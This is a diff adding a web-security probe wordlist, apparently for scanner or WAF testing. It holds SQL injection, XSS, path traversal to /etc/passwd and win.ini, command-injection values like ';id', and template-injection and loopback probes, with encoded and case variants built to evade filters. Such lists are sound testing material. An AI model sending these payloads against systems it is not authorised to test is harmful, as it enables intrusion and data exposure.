@@ -1,0 +1,80 @@
+' OR '1'='1 --
+<script>alert(1)</script>
+../../../../etc/passwd
+;id
+%3Cscript%3Ealert(1)%3C/script%3E
+test
+baseline
+AUROSE_PROBE
+..\..\..\..\windows\win.ini
+' OR '1'='1
+" OR "1"="1
+${7*7}
+{{7*7}}
+`id`
+127.0.0.1
+http://127.0.0.1
+https://example.com
+%27%20OR%20%271%27%3D%271%20--
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+..%2F..%2F..%2F..%2Fetc%2Fpasswd
+%3Bid
+%253Cscript%253Ealert%281%29%253C%2Fscript%253E
+..%5C..%5C..%5C..%5Cwindows%5Cwin.ini
+%27%20OR%20%271%27%3D%271
+%22%20OR%20%221%22%3D%221
+%24%7B7%2A7%7D
+%7B%7B7%2A7%7D%7D
+%60id%60
+http%3A%2F%2F127.0.0.1
+https%3A%2F%2Fexample.com
+<SCRIPT>ALERT(1)</SCRIPT>
+../../../../ETC/PASSWD
+;ID
+%3CSCRIPT%3EALERT(1)%3C/SCRIPT%3E
+TEST
+BASELINE
+..\..\..\..\WINDOWS\WIN.INI
+`ID`
+HTTP://127.0.0.1
+HTTPS://EXAMPLE.COM
+%3CSCRIPT%3EALERT%281%29%3C%2FSCRIPT%3E
+..%2F..%2F..%2F..%2FETC%2FPASSWD
+%3BID
+%253CSCRIPT%253EALERT%281%29%253C%2FSCRIPT%253E
+..%5C..%5C..%5C..%5CWINDOWS%5CWIN.INI
+%60ID%60
+HTTP%3A%2F%2F127.0.0.1
+HTTPS%3A%2F%2FEXAMPLE.COM
+' OR '1'%3D'1 --
+' OR '1'%3D'1
+" OR "1"%3D"1
+' OR '1'='1 --?v=0
+' OR '1'='1 --&v=0
+%27%20OR%20%271%27%3D%271%20--_0
+waf_0
+/waf/0
+' OR '1'='1 --%0a0
+<script>alert(1)</script>?v=1
+<script>alert(1)</script>&v=1
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E_1
+waf_1
+/waf/1
+<script>alert(1)</script>%0a1
+../../../../etc/passwd?v=2
+../../../../etc/passwd&v=2
+..%2F..%2F..%2F..%2Fetc%2Fpasswd_2
+waf_2
+/waf/2
+../../../../etc/passwd%0a2
+;id?v=3
+;id&v=3
+%3Bid_3
+waf_3
+/waf/3
+;id%0a3
+%3Cscript%3Ealert(1)%3C/script%3E?v=4
+%3Cscript%3Ealert(1)%3C/script%3E&v=4
+%253Cscript%253Ealert%281%29%253C%2Fscript%253E_4
+waf_4
+/waf/4
